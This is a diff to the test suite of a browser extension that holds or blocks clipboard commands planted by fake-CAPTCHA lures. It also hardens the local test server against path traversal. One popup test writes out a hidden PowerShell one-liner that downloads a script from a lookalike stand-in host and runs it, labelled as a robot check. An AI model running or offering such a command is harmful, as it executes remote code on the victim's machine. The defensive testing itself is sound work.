@@ -34,9 +34,12 @@ before(async () => {
   server = createServer(async (req, res) => {
     try {
       const name = decodeURIComponent(new URL(req.url, 'http://x').pathname).replace(/^\/+/, '') || 'index.html';
-      if (name.includes('..')) throw new Error('bad path');
+      if (name.includes('..') || name.includes('\\') || name.includes('\0')) throw new Error('bad path');
       // /docs/... serves the published site (for the safe demo), everything else the test pages.
-      let body = name.startsWith('docs/') ? await readFile(join(ROOT, name)) : await readFile(join(PAGES, name));
+      const dir = name.startsWith('docs/') ? ROOT : PAGES;
+      const file = resolve(dir, name);
+      if (!file.startsWith(dir + '/')) throw new Error('outside the test folders');
+      let body = await readFile(file);
       if (name.startsWith('review/')) body = Buffer.from(body.toString('utf8').replaceAll('PORT', String(port)).replaceAll(`localhost:${port}/`, `localhost:${port}/review/`));
       res.writeHead(200, { 'content-type': TYPES[extname(name)] || 'text/html; charset=utf-8' });
       res.end(body);
@@ -45,7 +48,8 @@ before(async () => {
       res.end('not found');
     }
   });
-  await new Promise((r) => server.listen(0, r)); // all interfaces: 127.0.0.1 and localhost are different origins
+  // Loopback only. Tests use both 127.0.0.1 and localhost, which are different origins.
+  await new Promise((r) => server.listen(0, '127.0.0.1', r));
   port = server.address().port;
   base = `http://127.0.0.1:${port}`;
 
@@ -287,7 +291,113 @@ test('the hook looks native to a simple toString check', async () => {
   await page.close();
 });
 
+// ---- Long copies (v0.3). -----------------------------------------------------
+test('"Copy anyway" copies the whole of a long held command, not a cut-off part', async () => {
+  const page = await open('long-copy.html');
+  const full = await page.evaluate(() => window.CFA_TEST.longInstaller);
+  assert.ok(full.length > 50000);
+  await page.click('#long-installer');
+  await waitUi(page, 'held');
+  assert.ok((await clipboard(page)).startsWith(HELD));
+  await page.keyboard.press('Tab');
+  await page.keyboard.press('Enter');
+  await page.waitForFunction((n) => navigator.clipboard.readText().then((c) => c.length === n), full.length, { timeout: 5000 });
+  assert.equal(await clipboard(page), full);
+  await page.close();
+});
+
+test('text longer than the guard can check is paused, never simply allowed', async () => {
+  const page = await open('long-copy.html');
+  const huge = await page.evaluate(() => window.CFA_TEST.huge);
+  await page.click('#huge');
+  await waitUi(page, 'held');
+  assert.ok((await clipboard(page)).startsWith(HELD));
+  await page.keyboard.press('Tab');
+  await page.keyboard.press('Enter');
+  await page.waitForFunction((n) => navigator.clipboard.readText().then((c) => c.length === n), huge.length, { timeout: 5000 });
+  await page.close();
+});
+
+// ---- The background worker can be stopped at any time (v0.3). ----------------
+async function extensionId() {
+  return new URL(context.serviceWorkers()[0].url()).host;
+}
+
+async function stopWorker() {
+  const page = await context.newPage();
+  const cdp = await context.newCDPSession(page);
+  await cdp.send('ServiceWorker.enable');
+  await cdp.send('ServiceWorker.stopAllWorkers');
+  await cdp.detach();
+  await page.close();
+}
+
+test('connecting the dots survives the background worker being stopped', async () => {
+  const page = await open('iframe-plain-top.html');
+  await page.waitForTimeout(1200); // the trap steps are seen and remembered
+  await stopWorker(); // Chrome does this by itself after about 30 idle seconds
+  await page.waitForTimeout(300);
+  await setClipboard(page, 'before');
+  await page.frameLocator('#captcha').locator('#robot').click();
+  await waitUi(page, 'blocked');
+  assert.ok((await clipboard(page)).startsWith(HELD));
+  await page.close();
+});
+
 // ---- The extension's own pages. ----------------------------------------------
+test('the popup checks a pasted command locally', async () => {
+  const id = await extensionId();
+  const page = await context.newPage();
+  await page.goto(`chrome-extension://${id}/popup/popup.html`);
+  const verdictFor = async (text) => {
+    await page.fill('#command', text);
+    await page.click('#check');
+    return page.getAttribute('#result', 'data-verdict');
+  };
+  assert.equal(await verdictFor('powershell -w h -nop -c "iwr https://cloubflare.example.top/5 | iex" # I am not a robot - Verification ID: 4821'), 'block');
+  assert.equal(await verdictFor(INSTALLER), 'hold');
+  assert.equal(await verdictFor('npm install react'), 'allow');
+  assert.match(await page.textContent('#result'), /does not prove it is safe/);
+  await page.close();
+});
+
+test('popup settings changes made at the same moment are all kept', async () => {
+  const id = await extensionId();
+  const page = await context.newPage();
+  await page.goto(`chrome-extension://${id}/popup/popup.html`);
+  await page.evaluate(() => chrome.storage.local.set({ settings: { holdInstallers: true, allowSites: ['a.example', 'b.example'] } }));
+  const results = await page.evaluate(() => Promise.all([
+    chrome.runtime.sendMessage({ type: 'cfa-popup', action: 'remove-site', host: 'a.example' }),
+    chrome.runtime.sendMessage({ type: 'cfa-popup', action: 'set-hold', value: false }),
+    chrome.runtime.sendMessage({ type: 'cfa-popup', action: 'remove-site', host: 'b.example' })
+  ]));
+  assert.deepEqual(results.map((r) => r.ok), [true, true, true]);
+  const s = await page.evaluate(() => chrome.storage.local.get('settings').then((r) => r.settings));
+  assert.deepEqual(s, { holdInstallers: false, allowSites: [] });
+  await page.evaluate(() => chrome.storage.local.set({ settings: { holdInstallers: true, allowSites: [] } }));
+  await page.close();
+});
+
+test("the extension's own pages cannot make network requests", async () => {
+  const id = await extensionId();
+  const page = await context.newPage();
+  await page.goto(`chrome-extension://${id}/popup/popup.html`);
+  const outcome = await page.evaluate((url) => fetch(url, { mode: 'no-cors' }).then(() => 'connected', (e) => 'refused: ' + e.name), `${base}/normal-copy.html`);
+  assert.match(outcome, /^refused/);
+  await page.close();
+});
+
+test('only the popup may change settings', async () => {
+  const id = await extensionId();
+  const page = await context.newPage();
+  await page.goto(`chrome-extension://${id}/pages/recovery.html`);
+  const r = await page.evaluate(() => chrome.runtime.sendMessage({ type: 'cfa-popup', action: 'set-hold', value: false }));
+  assert.equal(r.ok, false);
+  const s = await page.evaluate(() => chrome.storage.local.get('settings').then((x) => x.settings));
+  assert.notEqual(s && s.holdInstallers, false);
+  await page.close();
+});
+
 test('the popup counts what was blocked and paused', async () => {
   const worker = context.serviceWorkers()[0];
   const extId = new URL(worker.url()).host;
